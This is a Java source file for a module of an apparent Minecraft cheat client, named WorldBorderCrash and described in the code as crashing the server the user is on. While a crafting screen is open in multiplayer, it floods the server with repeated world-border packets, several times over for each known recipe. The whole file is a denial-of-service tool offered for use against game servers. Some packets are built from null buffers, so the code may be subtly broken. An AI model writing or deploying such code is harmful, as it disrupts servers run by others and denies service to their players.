package neptune.features.exploit;

import com.google.common.eventbus.Subscribe;
import neptune.event.events.GameLeftEvent;
import neptune.event.events.TickEvent;
import neptune.module.Mod;
import neptune.module.settings.BooleanSetting;
import neptune.module.settings.NumberSetting;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.s2c.play.*;
import net.minecraft.recipe.Recipe;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.screen.CraftingScreenHandler;
import net.minecraft.world.World;
import net.minecraft.world.border.WorldBorder;

import java.util.List;
import java.util.Objects;

public class WorldBorderCrash extends Mod {

    private final NumberSetting packets = new NumberSetting("Packets", 1, 50, 20, 0.1);
    private final BooleanSetting autoDisable = new BooleanSetting("AutoDisable", true);

    public WorldBorderCrash() {
        super("WorldBorderCrash", "Crashes the server you're in.", Category.EXPLOIT);
        addSettings(packets, autoDisable);
    }

    @Subscribe
    private void onTick(TickEvent tickEvent) {
        if (!mc.isInSingleplayer()) {
            if (mc.player != null && mc.getNetworkHandler() != null && mc.player.currentScreenHandler instanceof CraftingScreenHandler) {
                try {
                    List<RecipeResultCollection> recipeResultCollectionList = mc.player.getRecipeBook().getOrderedResults();
                    int j = 0;
                    while (j < recipeResultCollectionList.size()) {
                        RecipeResultCollection recipeResultCollection = recipeResultCollectionList.get(j);
                        List<RecipeEntry<?>> recipes = recipeResultCollection.getRecipes(true);
                        int k = 0;
                        while (k < recipes.size()) {
                            Recipe<?> recipe = recipes.get(k).value();
                            int bound = (int) packets.getValue();
                            int i = 0;
                            while (i < bound) {
                                Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new WorldBorderInitializeS2CPacket((PacketByteBuf) null));
                                mc.getNetworkHandler().sendPacket(new WorldBorderCenterChangedS2CPacket(new WorldBorder()));
                                mc.getNetworkHandler().sendPacket(new WorldBorderInterpolateSizeS2CPacket(new WorldBorder()));
                                mc.getNetworkHandler().sendPacket(new WorldBorderWarningTimeChangedS2CPacket((PacketByteBuf) null));
                                mc.getNetworkHandler().sendPacket(new WorldBorderWarningBlocksChangedS2CPacket(new WorldBorder()));
                                i++;
                            }
                            k++;
                        }
                        j++;
                    }

                } catch (Exception ignored) {
                    toggle();
                }
            } else {
                toggle();
            }
        } else {
            toggle();
        }
    }

    @Subscribe
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.isEnabled()) {
            toggle();
        }
    }

    @Override
    public void onEnable() {
        // Add any specific behavior when the mod is enabled
    }

    @Override
    public void onDisable() {
        // Add any specific behavior when the mod is disabled
    }
}
